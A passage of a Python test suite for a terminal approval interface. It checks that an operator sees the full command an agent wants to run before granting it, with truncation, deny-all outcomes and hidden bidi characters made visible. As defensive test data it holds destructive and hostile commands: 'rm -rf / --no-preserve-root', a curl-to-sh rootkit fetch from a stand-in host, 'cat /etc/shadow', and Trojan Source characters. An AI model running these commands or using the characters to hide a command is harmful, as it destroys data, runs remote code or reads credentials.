        assert any("approval answered: once" in e.text for e in app.state.transcript)
        await app.shutdown_sources()


# ── R8: waiting is not working, on the assembled interface ───────────────


@pytest.mark.asyncio
async def test_a_streaming_turn_that_blocks_stops_claiming_to_be_working() -> None:
    dispatcher = RecordingDispatcher()
    app = live_app(dispatcher)

    async with app.run_test() as pilot:
        feed(app, event("message.start", {}))
        feed(app, event("message.delta", {"text": "thinking"}), seq=101)
        await settle(app, pilot)
        assert app.prompts.activity_text == "working…"

        feed(app, event("sudo.request", {"request_id": "u-1"}), seq=102)
        await settle(app, pilot)

        assert app.prompts.activity_text.startswith("waiting for you")
        assert "working" not in app.prompts.activity_text
        assert app.prompts.has_class("-waiting")
        await app.shutdown_sources()


@pytest.mark.asyncio
async def test_a_new_control_does_not_steal_a_half_typed_message() -> None:
    """A blocking prompt has a real claim on the caret; taking it mid-word
    drops the keystrokes already in flight."""
    dispatcher = RecordingDispatcher()
    app = live_app(dispatcher)

    async with app.run_test() as pilot:
        app.composer.text = "half a thought"
        app.composer.text_area.focus()
        feed(app, event("sudo.request", {"request_id": "u-1"}))
        await settle(app, pilot)

        assert app.composer.text == "half a thought"
        assert app.focused is app.composer.text_area
        await app.shutdown_sources()


@pytest.mark.asyncio
async def test_an_empty_composer_hands_the_caret_to_the_new_control() -> None:
    dispatcher = RecordingDispatcher()
    app = live_app(dispatcher)

    async with app.run_test() as pilot:
        app.composer.text_area.focus()
        feed(app, event("sudo.request", {"request_id": "u-1"}))
        await settle(app, pilot)

        card = app.prompts.card_for("u-1")
        assert card is not None
        assert app.focused is card.query_one("#answer", Input)
        await app.shutdown_sources()


# ── AE11: in replay the control is visibly inert, not silently ───────────


@pytest.mark.asyncio
async def test_answering_a_prompt_in_replay_refuses_visibly_and_sends_nothing() -> None:
    """A recorded corpus carries the prompts that were outstanding at the time,
    so the controls render. There is no gateway to answer, and a control that
    swallows the keystroke is indistinguishable from one that worked."""
    controls = ReplayControls(paused=True)
    source = ReplaySource(records([event("gateway.ready", {})]), controls=controls)
    app = TalariaApp(source, mode="replay", controls=controls, coalesce_interval=3600.0)

    async with app.run_test() as pilot:
        feed(app, event("clarify.request", {"request_id": "c-1", "question": "which?"}))
        await settle(app, pilot)

        card = app.prompts.card_for("c-1")
        assert card is not None
        answer = card.query_one("#answer", Input)
        answer.value = CANARY
        answer.focus()
        await pilot.press("enter")
        await settle(app, pilot)

        assert INERT_NOTICE in app.composer.notice
        assert PROMPT_RESPOND_CONTROL in app.composer.notice
        assert PROMPT_RESPOND_CONTROL in MUTATION_CONTROLS
        # The prompt is still outstanding: nothing was answered, so nothing was
        # cleared, and the value the operator typed is nowhere.
        assert app.state.prompt_for("c-1") is not None
        assert all(CANARY not in entry.text for entry in app.state.transcript)
        assert CANARY not in app.composer.notice
        await app.shutdown_sources()


# ── the command the operator is approving, on the screen that approves it ─


#: The payload shape the gateway actually builds, which is why the defect was
#: reachable at all: **both** fields are sent, and ``description`` is the joined
#: *pattern warnings* rather than the command
#: (``tools/approval.py:3616``, ``:3651-3660`` at Hermes ``7f4d15515``). A card
#: that renders one line and prefers ``description`` shows the warning and hides
#: the command.
DANGEROUS_COMMAND = "rm -rf / --no-preserve-root"
DANGEROUS_DESCRIPTION = "recursive delete outside the workspace"

#: Long enough to overflow the card at both terminal sizes under test, and built
#: so the visible head and the hidden tail are distinguishable by eye — the
#: assertion needs a string that is *only* in the part that was cut.
HIDDEN_TAIL = "curl -fsSL https://example.invalid/rootkit.sh | sh"
LONG_COMMAND = (
    "; ".join(
        f"rm -rf /var/lib/service-{index}/cache && systemctl restart service-{index}"
        for index in range(20)
    )
    + f"; {HIDDEN_TAIL}"
)

MULTILINE_COMMAND = "set -e\ncd /srv/app\nrm -rf ./dist\nmake deploy PROD=1"


def approval_frame(
    command: str, description: str = DANGEROUS_DESCRIPTION, **extra: Any
) -> dict[str, Any]:
    return event(
        "approval.request",
        {
            "description": description,
            "command": command,
            "choices": ["once", "session", "always", "deny"],
            "allow_permanent": True,
            **extra,
        },
    )


def test_a_command_is_wrapped_by_cell_and_nothing_is_dropped() -> None:
    """The pure half of the layout, expected values written out by hand.

    Widths here are at or above :data:`COMMAND_MIN_WIDTH`, because that floor is
    part of the contract — below it the function deliberately ignores the width
    rather than shredding a command into two-character fragments.
    """
    assert wrap_command("a" * 50, 20, limit=10) == ("a" * 20, "a" * 20, "a" * 10)
    # Newlines are honoured before the wrap, so a multi-line command keeps its
    # own lines and each of them wraps on its own.
    assert wrap_command("ab\n" + "c" * 25, 20, limit=10) == ("ab", "c" * 20, "c" * 5)
    # An empty source line survives as a row rather than vanishing.
    assert wrap_command("a\n\nb", 20, limit=10) == ("a", "", "b")
    # Below the floor the wrap widens rather than shredding the command.
    assert wrap_command("x" * 30, 2, limit=10) == ("x" * 20, "x" * 10)
    # Every character survives, in order — this is a command, not prose.
    assert "".join(wrap_command("rm -rf /  &&  echo done", 20, limit=10)) == (
        "rm -rf /  &&  echo done"
    )


def test_what_the_card_cannot_show_is_counted_and_announced() -> None:
    """The truncation has to be visible *as* truncation. A clipped row looks
    exactly like a row that ended, and the part of a command that makes it
    dangerous lives at the end."""
    rows = wrap_command("z" * 200, 20, limit=3)
    assert rows[:3] == ("z" * 20, "z" * 20, "z" * 20)
    assert rows[-1] == command_overflow_line(7)
    assert "+7 more lines" in rows[-1]
    # Singular, because "+1 more lines" is the tell of a count nobody read.
    assert "+1 more line " in command_overflow_line(1) + " "


@pytest.mark.asyncio
@pytest.mark.parametrize("size", [(80, 24), (120, 40)])
async def test_the_command_is_on_screen_before_the_button_that_grants_it(
    size: tuple[int, int],
) -> None:
    """**The safety defect, on the assembled interface at two terminal sizes.**

    The card used to render one line — the gateway's ``description`` — and four
    buttons. At the pin ``description`` is essentially always populated and it
    describes the *warnings*, so ``rm -rf / --no-preserve-root`` was absent from
    the screen while ``#choice-0`` granted it.

    Every assertion here is positive and taken from ``export_screenshot``: the
    command's own characters, on rows that exist, beside buttons that have
    height. The one negative — the description alone is not the whole card — is
    carried by asserting the command *in addition to* it.
    """
    dispatcher = RecordingDispatcher()
    app = live_app(dispatcher)

    async with app.run_test(size=size) as pilot:
        feed(app, approval_frame(DANGEROUS_COMMAND))
        await settle(app, pilot)

        screen = screen_text(app)
        assert DANGEROUS_COMMAND in screen, screen
        assert DANGEROUS_DESCRIPTION in screen
        card = app.prompts.card_for("approval:s1#1")
        assert card is not None
        panel = card.query_one(CommandPanel)
        assert panel.content_size.height >= 1
        assert panel.rendered_width > 0
        labels = [str(b.label) for b in card.query(Button)]
        assert labels == ["once", "session", "always", "deny"]
        for label in labels:
            assert label in screen
        assert all(b.content_size.height >= 1 for b in card.query(Button))

        await pilot.click("#choice-0")
        await settle(app, pilot)
        await settle(app, pilot)
        assert dispatcher.operator_calls == [
            ("approval.respond", {"session_id": "s1", "choice": "once"})
        ]
        await app.shutdown_sources()


@pytest.mark.asyncio
@pytest.mark.parametrize("size", [(80, 24), (120, 40)])
async def test_a_command_too_long_for_the_card_is_truncated_visibly(
    size: tuple[int, int],
) -> None:
    """A long command is the ordinary case for the commands worth approving, and
    the dangerous clause is usually at the end. So the card shows what it can,
    says how many rows it is not showing, and the whole command is in the
    transcript — asserted as a *presence* there, because "the tail is not on the
    card" on its own is satisfied by an empty card."""
    dispatcher = RecordingDispatcher()
    app = live_app(dispatcher)

    async with app.run_test(size=size) as pilot:
        feed(app, approval_frame(LONG_COMMAND))
        await settle(app, pilot)

        card = app.prompts.card_for("approval:s1#1")
        assert card is not None
        panel = card.query_one(CommandPanel)
        rows = panel.rows
        assert len(rows) == COMMAND_PREVIEW_LINES + 1
        hidden = int(rows[-1].split("+")[1].split(" ")[0])
        assert rows[-1] == command_overflow_line(hidden)

        screen = screen_text(app)
        # Present: the head of the command, the marker, and the buttons — every
        # row the panel claims to render is on the rendered screen, which is
        # what makes the absence below a statement about the card rather than
        # about an empty widget.
        assert LONG_COMMAND[:40] in screen
        assert rows[-1] in screen
        assert "deny" in screen
        assert all(b.content_size.height >= 1 for b in card.query(Button))
        # Absent from the card, and present in the transcript. The absence is
        # scoped to the card's own rows on purpose: the transcript pane above
        # legitimately shows the whole command, and at 120x40 it has the room
        # to, so a whole-screen negative here would be asserting the opposite of
        # what the audit trail is for.
        assert HIDDEN_TAIL not in "\n".join(rows)
        arrival = next(e for e in app.state.transcript if e.kind == "prompt")
        assert f"{APPROVAL_COMMAND_LABEL}{LONG_COMMAND}" in arrival.text
        assert HIDDEN_TAIL in arrival.text
        await app.shutdown_sources()


@pytest.mark.asyncio
async def test_a_multi_line_command_keeps_every_line_on_screen() -> None:
    """A ``\\n`` in a command is a second statement, not decoration. Rendering
    it as one row — or defanging it into a control picture — would show the
    operator a command that is not the one that will run."""
    dispatcher = RecordingDispatcher()
    app = live_app(dispatcher)

    async with app.run_test(size=(80, 24)) as pilot:
        feed(app, approval_frame(MULTILINE_COMMAND))
        await settle(app, pilot)

        screen = screen_text(app)
        for statement in MULTILINE_COMMAND.split("\n"):
            assert statement in screen, statement
        card = app.prompts.card_for("approval:s1#1")
        assert card is not None
        assert card.query_one(CommandPanel).rows == tuple(MULTILINE_COMMAND.split("\n"))
        await app.shutdown_sources()


@pytest.mark.asyncio
async def test_the_transcript_says_which_command_was_approved() -> None:
    """An approval that cannot be audited afterwards is half a fix. The arrival
    entry carries the command unclipped; the answered entry carries the choice
    *and* the command, so one line answers "did I allow that"."""
    dispatcher = RecordingDispatcher(
        RpcOutcome(
            status="ok",
            method="approval.respond",
            request_id="1",
            epoch=1,
            result={"resolved": 1},
        )
    )
    app = live_app(dispatcher)

    async with app.run_test() as pilot:
        feed(app, approval_frame(DANGEROUS_COMMAND))
        await settle(app, pilot)
        await app.respond_live("approval:s1#1", "once")
        await settle(app, pilot)

        arrival = next(e for e in app.state.transcript if e.kind == "prompt")
        assert arrival.text.splitlines() == [
            f"approval prompt awaiting an answer: {DANGEROUS_DESCRIPTION}",
            f"{APPROVAL_COMMAND_LABEL}{DANGEROUS_COMMAND}",
        ]
        answered = [e.text for e in app.state.transcript if "approval answered" in e.text]
        assert answered == [
            f"approval answered: once · {APPROVAL_COMMAND_LABEL}{DANGEROUS_COMMAND}"
        ]
        await app.shutdown_sources()


# ── the approval whose answer is still travelling ────────────────────────


@pytest.mark.asyncio
async def test_a_second_approval_arriving_mid_answer_cannot_be_answered() -> None:
    """**Reachable in the ordinary case, not a race.** ``_spawn_live`` runs each
    respond as its own task precisely so the pump keeps rendering, so the window
    between "the answer left" and "the reply arrived" is a window the operator
    is looking at a live interface in.

    ``respond_to_prompt`` moves the prompt into ``answering`` before the call
    goes out. While ``outstanding_approvals`` read ``prompts`` alone, the
    approval just answered was invisible to the rule that exists to stop a
    second one being answered: the second card arrived answerable, with its
    affirmatives, and pressing one put a *second* ``approval.respond`` in flight
    against a resolver that pops the FIFO head with no discriminator.
    """
    dispatcher = HoldingDispatcher()
    app = live_app(dispatcher)

    async with app.run_test() as pilot:
        feed(app, approval_frame("rm -rf /data", "destructive delete"))
        await settle(app, pilot)

        first = asyncio.create_task(app.respond_live("approval:s1#1", "once"))
        while not dispatcher.operator_calls:
            await asyncio.sleep(0)
        # The answer is on the wire and the prompt is out of the registry: the
        # exact state the rule used to be blind to.
        assert app.state.prompts == ()
        assert [p.request_id for p in app.state.answering] == ["approval:s1#1"]

        feed(app, approval_frame("ls", "directory listing"), seq=101)
        await app.render_snapshot()
        await pilot.pause()

        card = app.prompts.card_for("approval:s1#2")
        assert card is not None
        screen = screen_text(app)
        # Present: the command, the reason, and the one action that needs no aim.
        assert "ls" in screen
        assert "cannot be aimed" in screen
        assert [str(b.label) for b in card.query(Button)] == ["deny all"]
        assert all(b.content_size.height >= 1 for b in card.query(Button))
        # Absent: the affirmative that would put a second answer on the wire.
        assert "once" not in screen

        outcome = await app.respond_live("approval:s1#2", "once")
        assert outcome is None
        assert len(dispatcher.operator_calls) == 1
        assert REFUSED_UNCORRELATED_APPROVAL in app.composer.notice
        assert app.state.rejected_responses == 1

        dispatcher.gate.set()
        await first
        await settle(app, pilot)
        await app.shutdown_sources()


@pytest.mark.asyncio
async def test_deny_all_names_the_in_flight_approval_without_calling_it_denied() -> None:
    """``all: true`` reaches every entry in the gateway's queue
    (``resolve_gateway_approval(..., resolve_all=True)`` over ``list(queue)``),
    including the one whose own answer has not come back.

    **Both halves of that are claims about the transcript, and the line has to
    make one without making the other.** Saying nothing about the in-flight
    approval reported two while the denial swept three. Adding it to the denied
    count said the operator's own ``once`` had been denied — while the same
    transcript carried ``approval answered: once``, two fates for one command.
    So it is named in its own clause and the clause says the outcome is not
    known.

    The whole assertion is on one exact string rather than on fragments,
    because the defect both times was *which number sat next to which word*.
    """
    dispatcher = HoldingDispatcher(
        RpcOutcome(
            status="ok",
            method="approval.respond",
            request_id="1",
            epoch=1,
            result={"resolved": 3},
        )
    )
    app = live_app(dispatcher)

    async with app.run_test() as pilot:
        feed(app, approval_frame("rm -rf /data", "destructive delete"))
        await settle(app, pilot)

        first = asyncio.create_task(app.respond_live("approval:s1#1", "once"))
        while not dispatcher.operator_calls:
            await asyncio.sleep(0)

        feed(app, approval_frame("ls", "directory listing"), seq=101)
        feed(app, approval_frame("cat /etc/shadow", "credential read"), seq=102)
        await app.render_snapshot()
        await pilot.pause()
        assert app.state.outstanding_approvals("s1") == tuple(
            sorted(app.state.outstanding_approvals("s1"), key=lambda p: p.seq)
        )
        assert len(app.state.outstanding_approvals("s1")) == 3

        await app.deny_all_approvals_live("s1")

        line = next(e.text for e in app.state.transcript if DENIED_EVERY_APPROVAL in e.text)
        assert line == (
            f"{DENIED_EVERY_APPROVAL}: 2 waiting "
            f"(+1 {ANSWER_ALREADY_TRAVELLING}), 3 resolved"
        )
        dispatcher.gate.set()
        await first
        await settle(app, pilot)
        await app.shutdown_sources()


# ── deny-all is read through the same machinery as a single answer ───────


@pytest.mark.asyncio
async def test_deny_all_reads_the_reply_body_the_single_answer_path_reads() -> None:
    """``{"status": "expired"}`` is a JSON-RPC **success** whose body says the
    answer was thrown away. The single-answer path was taught to read it and
    deny-all was not, so the gateway discarded a denial and the interface said
    it had been applied — on the only action offered once two approvals queue."""
    dispatcher = RecordingDispatcher(
        RpcOutcome(
            status="ok",
            method="approval.respond",
            request_id="1",
            epoch=1,
            result={"status": "expired"},
        )
    )
    app = live_app(dispatcher)

    async with app.run_test() as pilot:
        two_approvals(app)
        await settle(app, pilot)

        await pilot.click("#deny-all")
        await settle(app, pilot)
        await settle(app, pilot)

        lines = [e.text for e in app.state.transcript if "approvals not denied" in e.text]
        assert lines == [f"2 approvals not denied — {GATEWAY_DISCARDED_ANSWER}"]
        assert not any(DENIED_EVERY_APPROVAL in e.text for e in app.state.transcript)
        assert GATEWAY_DISCARDED_ANSWER in app.composer.notice
        await app.shutdown_sources()


@pytest.mark.asyncio
async def test_deny_all_that_resolved_nothing_is_not_written_as_applied() -> None:
    """The approval-shaped half of the same body check: ``{"resolved": 0}``
    means the queue was empty when the denial landed."""
    dispatcher = RecordingDispatcher(
        RpcOutcome(
            status="ok",
            method="approval.respond",
            request_id="1",
            epoch=1,
            result={"resolved": 0},
        )
    )
    app = live_app(dispatcher)

    async with app.run_test() as pilot:
        two_approvals(app)
        await settle(app, pilot)
        await pilot.click("#deny-all")
        await settle(app, pilot)
        await settle(app, pilot)

        assert any(
            f"2 approvals not denied — {GATEWAY_HAD_NO_APPROVAL}" in e.text
            for e in app.state.transcript
        )
        await app.shutdown_sources()


@pytest.mark.asyncio
async def test_deny_all_says_delivery_is_unconfirmed_exactly_when_it_is() -> None:
    """The two paths used to disagree about one transport condition: the
    single-answer path said "delivery unconfirmed" and deny-all said the denial
    had been applied, for the identical outcome."""
    outcome = unknown_outcome("approval.respond", NO_REPLY_IN_TIME, epoch=1)
    dispatcher = RecordingDispatcher(outcome)
    app = live_app(dispatcher)

    async with app.run_test() as pilot:
        two_approvals(app)
        await settle(app, pilot)
        await pilot.click("#deny-all")
        await settle(app, pilot)
        await settle(app, pilot)

        line = next(e.text for e in app.state.transcript if DENIED_EVERY_APPROVAL in e.text)
        assert "delivery unconfirmed" in line
        # And it is the *same* sentence the single-answer path uses, taken from
        # the one table rather than a second wording that happens to agree
        # today. This was once asserted as a prefix, because the 120-character
        # transcript clip cut the explanatory tail off every delivery note; the
        # whole sentence now survives, so it is asserted whole.
        reason = read_answer("approval", outcome).reason
        assert reason is not None
        assert line == f"{DENIED_EVERY_APPROVAL}: 2 waiting — {reason}"
        assert not line.endswith("…")
        await app.shutdown_sources()


@pytest.mark.asyncio
async def test_deny_all_never_shows_the_operator_a_python_none() -> None:
    """"None resolved" reads in English as "none resolved", which is the
    opposite of "the gateway did not say"."""
    dispatcher = RecordingDispatcher(
        RpcOutcome(
            status="ok", method="approval.respond", request_id="1", epoch=1, result={}
        )
    )
    app = live_app(dispatcher)

    async with app.run_test() as pilot:
        two_approvals(app)
        await settle(app, pilot)
        await pilot.click("#deny-all")
        await settle(app, pilot)
        await settle(app, pilot)

        line = next(e.text for e in app.state.transcript if DENIED_EVERY_APPROVAL in e.text)
        assert line == f"{DENIED_EVERY_APPROVAL}: 2 waiting, {UNCOUNTED_RESOLUTION}"
        assert "None" not in line
        await app.shutdown_sources()


@pytest.mark.parametrize(
    "outcome,disposition,reason_fragment",
    [
        (
            RpcOutcome(
                status="ok", method="approval.respond", request_id="1", epoch=1,
                result={"resolved": 2},
            ),
            "used",
            None,
        ),
        (
            RpcOutcome(
                status="ok", method="approval.respond", request_id="1", epoch=1,
                result={"status": "expired"},
            ),
            "discarded",
            GATEWAY_DISCARDED_ANSWER,
        ),
        (
            unknown_outcome("approval.respond", NOT_CONNECTED, epoch=0),
            "not_sent",
            "never written to a gateway",
        ),
        (
            unknown_outcome("approval.respond", LOST_WITH_TRANSPORT, epoch=1),
            "used",
            "delivery unconfirmed",
        ),
        (
            RpcOutcome(
                status="error", method="approval.respond", request_id="1", epoch=1,
                error_code=4009, error_message="no pending answer request",
            ),
            "error",
            "refused by the gateway",
        ),
    ],
)
def test_one_reading_of_an_outcome_serves_both_answer_paths(
    outcome: RpcOutcome, disposition: str, reason_fragment: str | None
) -> None:
    """The choke point itself. Both paths call this, so the five outcomes cannot
    be classified two ways — which is the defect deny-all shipped with, and the
    rule LEARNINGS already records: a sanitizer attached to one selection rule
    is not a boundary."""
    verdict = read_answer("approval", outcome)
    assert verdict.disposition == disposition
    if reason_fragment is None:
        assert verdict.reason is None
    else:
        assert verdict.reason is not None and reason_fragment in verdict.reason
    # Only the one outcome that is definite about non-delivery re-offers the
    # question; anything else would deliver a second answer to it.
    assert verdict.restore is (disposition == "not_sent")


# ── round 4: the defects the round-3 fixes exposed ───────────────────────


@pytest.mark.asyncio
async def test_a_terminal_read_that_reaches_no_socket_is_answered_once() -> None:
    """**The loop, with the loop running.**

    ``terminal.read`` is answered from the render pass, and the render pass
    fires on a timer. An answer that reached no socket used to take the
    ``restore`` branch like any other bridge: the prompt went back into the
    registry, the next tick saw it and dispatched again, that failed the same
    way, and so on — at the production 50ms interval, about twenty
    ``terminal.read.respond`` calls a second for as long as the socket stayed
    down. Each attempt also wrote ``terminal read not answered — …`` into the
    transcript, which is the buffer this bridge *serves*, so the answer grew
    every round: 159 characters to 884 across three cycles.

    Two independent bounds are asserted, because either one alone is a bound
    that can be removed without the suite noticing. The dispatch is latched per
    request id, and the failure is reported on the notice bar rather than into
    the transcript.
    """
    dispatcher = RecordingDispatcher(
        unknown_outcome("terminal.read.respond", NOT_CONNECTED, epoch=0)
    )
    app = live_app(dispatcher, coalesce_interval=0.01)

    async with app.run_test() as pilot:
        feed(app, event("terminal.read.request", {"request_id": "t-1"}))
        app._dirty = True
        # Long enough for ~40 ticks of the 10ms timer. The pre-fix behaviour
        # produced 136 calls in 400ms with the same arrangement.
        for _ in range(40):
            await asyncio.sleep(0.01)
            await pilot.pause()
        await app.settle_live()
        await pilot.pause()

        respond_calls = [m for m, _ in dispatcher.operator_calls if m == "terminal.read.respond"]
        assert respond_calls == ["terminal.read.respond"]
        # The bridge that serves the transcript wrote nothing into it. Asserted
        # against the transcript *data* rather than against the screen, because
        # the notice bar carries the same sentence and is on the same screen.
        assert not [
            e for e in app.state.transcript if TERMINAL_READ_UNAVAILABLE.split(" —")[0] in e.text
        ]
        assert app.state.prompt_for("t-1") is None

        # …and the operator is still told, on the surface that is not the
        # buffer. Positive, from the rendered screen for what fits on the one
        # notice row, and from the widget for the clause past its edge.
        assert "terminal read not answered — not sent" in screen_text(app)
        assert "never written to a gateway" in app.composer.notice
        await app.shutdown_sources()


@pytest.mark.asyncio
async def test_narrowing_the_terminal_keeps_the_approval_answerable() -> None:
    """**The card that still looks live after every control has left the screen.**

    ``CommandPanel`` re-wraps on resize and calls ``update()``, which grows the
    widget *after* layout has placed the card's height. Narrowed from 120x40 to
    60x20 with a 346-character command up, the panel went from four rows to
    seven and pushed the three buttons to row 17 while the prompt region ended
    at row 14 — stable, never self-correcting, and silent: the card kept its
    "waiting for you" title and its command body, so it read as a live control
    while ``await pilot.click("#choice-0")`` produced no call at all.

    Mounting fresh at 60x20 works, which is why the suite could not see this:
    every screenshot in this file was taken at a size the card was *mounted*
    at, and ``resize`` appeared in it zero times.
    """
    dispatcher = RecordingDispatcher()
    app = live_app(dispatcher)
    command = "rm -rf /var/lib/service-a/cache && systemctl restart service-a && echo " + (
        "x" * 240
    )

    async with app.run_test(size=(120, 40)) as pilot:
        feed(app, approval_frame(command))
        await settle(app, pilot)

        await pilot.resize_terminal(60, 20)
        for _ in range(3):
            await settle(app, pilot)

        card = app.prompts.card_for("approval:s1#1")
        assert card is not None
        screen = screen_text(app)
        # Positive, and all of it from one screenshot: the command the card is
        # asking about, every button that answers it, and the row each button
        # occupies. A blank screen satisfies none of these.
        assert "rm -rf /var/lib/service-a/cache" in screen
        for label in ("once", "session", "always", "deny"):
            assert label in screen, f"{label!r} left the screen when the terminal narrowed"
        buttons = list(card.query(Button))
        assert len(buttons) == 4
        region = app.prompts.region
        for button in buttons:
            assert button.content_size.height >= 1
            assert region.contains_region(button.region), (
                f"{button.id} sits at {button.region} outside the prompt region {region}"
            )

        # And the click the operator would make actually answers.
        await pilot.click("#choice-0")
        await settle(app, pilot)
        assert dispatcher.operator_calls == [
            ("approval.respond", {"session_id": "s1", "choice": "once"})
        ]
        await app.shutdown_sources()


def test_the_activity_line_does_not_wait_on_a_human_for_an_unattended_prompt() -> None:
    """A terminal-read has no card anywhere — ``PromptRegion.apply`` filters
    :data:`UNATTENDED_KINDS` before mounting — so a line saying a human is being
    waited on for it points at nothing and asks for nothing."""
    read = PromptRow(request_id="t-1", kind="terminal_read", summary="terminal read requested")
    assert activity_line("waiting", PromptView(rows=(read,))) == ""

    approval = PromptRow(
        request_id="approval:s1#1", kind="approval", summary="recursive delete"
    )
    # The read is not named *and* it is not counted: it used to take the head
    # of the line and relegate the approval — the one prompt with a control —
    # to "(+1 more)".
    both = activity_line("waiting", PromptView(rows=(read, approval)))
    assert both == "waiting for you — approval: recursive delete"
    assert "more" not in both
    assert attended_rows(PromptView(rows=(read, approval))) == (approval,)


@pytest.mark.asyncio
async def test_the_screen_names_the_prompt_that_has_a_control() -> None:
    """The same rule on the assembled interface, in replay — where there is no
    dispatcher, so an unattended prompt is never answered and the overlay it
    produced stayed for the whole session."""
    controls = ReplayControls(paused=True)
    source = ReplaySource(records([event("gateway.ready", {})]), controls=controls)
    app = TalariaApp(source, mode="replay", controls=controls, coalesce_interval=3600.0)

    async with app.run_test(size=(100, 30)) as pilot:
        feed(app, event("terminal.read.request", {"request_id": "t-1"}))
        feed(app, approval_frame(DANGEROUS_COMMAND), seq=101)
        await settle(app, pilot)

        assert app.prompts.activity_text == (
            f"waiting for you — approval: {DANGEROUS_DESCRIPTION}"
        )
        screen = screen_text(app)
        # Positive: the line that is on screen, and the card it points at.
        assert f"waiting for you — approval: {DANGEROUS_DESCRIPTION}" in screen
        assert DANGEROUS_COMMAND in screen
        assert list(app.prompts.card_ids) == ["approval:s1#1"]
        # The activity line is a widget of its own, so the negative is scoped
        # to it rather than to the whole screen — the transcript above
        # legitimately records the read arriving, and should.
        assert "terminal read" not in app.prompts.activity_text
        assert any("terminal_read prompt awaiting" in e.text for e in app.state.transcript)
        await app.shutdown_sources()


#: The Trojan Source set: bidirectional formatting plus the characters that
#: occupy no cells. Written out here rather than imported from the module under
#: test, so a codepoint quietly dropped from the table fails this list.
TROJAN_SOURCE = (
    "‪‫‬‭‮"  # embeddings and overrides
    "⁦⁧⁨⁩"  # isolates
    "‎‏؜"  # implicit marks
    "​‌‍⁠﻿­"  # zero width
)


def test_every_bidi_and_zero_width_character_is_replaced_by_a_visible_cell() -> None:
    """A terminal reorders glyphs on its own when the text carries an override,
    and a zero-width character occupies no cells at all — so the rendered
    command and the executed command can differ with nothing on screen to see.
    Neither has an escape character to look for, which is why the C0 table
    missed both."""
    for char in TROJAN_SOURCE:
        assert defang(char) == INVISIBLE_MARK, f"U+{ord(char):04X} survived defang"
    # One cell each, so the column arithmetic ``wrap_command`` does still
    # matches what the terminal draws.
    assert cell_len(INVISIBLE_MARK) == 1
    assert defang("rm -rf /home/build") == "rm -rf /home/build"
    # A zero-width space inside a path is counted as a real cell once replaced,
    # so the wrap no longer disagrees with the screen about the row's width.
    assert wrap_command("rm -rf /home​build", 40, limit=4) == (
        f"rm -rf /home{INVISIBLE_MARK}build",
    )


@pytest.mark.asyncio
async def test_a_bidi_override_never_reaches_the_card_or_the_transcript() -> None:
    """The E1 fix is what made this reachable: while the command was never
    rendered there was nothing to deceive.

    What is asserted here is what is demonstrable. That the characters no longer
    reach any *rendered* surface — the card's rows, the screenshot, and the
    transcript pane's own drawing of the arrival entry — is a claim this test
    proves. That a real terminal would have *reordered* the glyphs is not
    provable through ``export_screenshot``, because an SVG screenshot performs
    no bidi reordering; the assertion is about the bytes reaching the renderer,
    not about the picture a terminal would have drawn from them.

    The stored transcript entry keeps the gateway's bytes exactly as they
    arrived, and that is deliberate rather than a gap. It is the audit record of
    what was asked for, it is drawn through :func:`literal_text` like every
    other line, and defanging it in the domain would both lose evidence and
    make ``talaria.domain`` import the terminal layer (ADR-0002).
    """
    dispatcher = RecordingDispatcher()
    app = live_app(dispatcher)
    hostile = f"rm -rf /home​build{chr(0x202E)} # safe"

    async with app.run_test(size=(100, 30)) as pilot:
        feed(app, approval_frame(hostile))
        await settle(app, pilot)

        card = app.prompts.card_for("approval:s1#1")
        assert card is not None
        rows = card.query_one(CommandPanel).rows
        screen = screen_text(app)
        arrival = next(e for e in app.state.transcript if e.kind == "prompt")

        # Positive first: the command is rendered, and the two hidden
        # characters are rendered *as* two visible cells — on the card and,
        # separately, on the transcript pane's drawing of the arrival entry.
        assert f"rm -rf /home{INVISIBLE_MARK}build{INVISIBLE_MARK} # safe" in screen
        assert "".join(rows).count(INVISIBLE_MARK) == 2
        assert screen.count(f"rm -rf /home{INVISIBLE_MARK}build") == 2
        # …so these negatives are about a screen that demonstrably rendered.
        for char in ("​", "‮"):
            assert char not in screen
            assert char not in "".join(rows)
            # …and the evidence is intact underneath it.
            assert char in arrival.text
        await app.shutdown_sources()


def _denied_counts(app: TalariaApp) -> list[int]:
    """Every ``N`` the transcript claimed as denied, in order."""
    return [
        int(e.text.split(": ", 1)[1].split(" ", 1)[0])
        for e in app.state.transcript
        if e.text.startswith(DENIED_EVERY_APPROVAL)
    ]


@pytest.mark.asyncio
async def test_repeated_deny_all_never_claims_more_denials_than_approvals() -> None:
    """Deny-all is one keystroke away from itself: any approval arriving inside
    a deny-all round trip mounts a card whose *only* action is "deny all". The
    second press used to re-count every approval the first had already claimed
    — three approvals, two presses, five denials reported."""
    dispatcher = HoldingDispatcher(
        RpcOutcome(
            status="ok", method="approval.respond", request_id="1", epoch=1,
            result={"resolved": 2},
        )
    )
    app = live_app(dispatcher)

    async with app.run_test() as pilot:
        feed(app, approval_frame("rm -rf /data", "destructive delete"))
        feed(app, approval_frame("ls", "directory listing"), seq=101)
        await settle(app, pilot)

        first = asyncio.create_task(app.deny_all_approvals_live("s1"))
        while not dispatcher.operator_calls:
            await asyncio.sleep(0)

        feed(app, approval_frame("cat /etc/shadow", "credential read"), seq=102)
        await app.render_snapshot()
        await pilot.pause()

        # Positive, from the screen: the third approval really is up, with the
        # one control that invites the second press.
        screen = screen_text(app)
        assert "cat /etc/shadow" in screen
        assert "deny all" in screen

        await app.deny_all_approvals_live("s1")
        dispatcher.gate.set()
        await first
        await settle(app, pilot)

        # Three approvals arrived; no more than three may ever be claimed as
        # denied, however many times the button is pressed.
        assert sum(_denied_counts(app)) == 3
        assert len(_denied_counts(app)) == 2
        await app.shutdown_sources()


@pytest.mark.asyncio
async def test_deny_all_does_not_call_an_in_flight_allow_a_denial() -> None:
    """**Two ``approval.respond`` calls outstanding at once, one carrying
    ``once`` and one carrying ``deny, all``.**

    Which of them the gateway applies is decided by arrival order there, which
    Talaria does not know and does not wait for. Folding the in-flight approval
    into the denied count produced a transcript asserting two different fates
    for one command: ``denied every waiting approval: 2 waiting`` beside
    ``approval answered: once · command: rm -rf /data``.
    """
    dispatcher = HoldingDispatcher(
        RpcOutcome(
            status="ok", method="approval.respond", request_id="1", epoch=1,
            result={"resolved": 2},
        )
    )
    app = live_app(dispatcher)

    async with app.run_test() as pilot:
        feed(app, approval_frame("rm -rf /data", "destructive delete"))
        await settle(app, pilot)

        allow = asyncio.create_task(app.respond_live("approval:s1#1", "once"))
        while not dispatcher.operator_calls:
            await asyncio.sleep(0)

        feed(app, approval_frame("ls", "directory listing"), seq=101)
        await app.render_snapshot()
        await pilot.pause()
        await app.deny_all_approvals_live("s1")

        dispatcher.gate.set()
        await allow
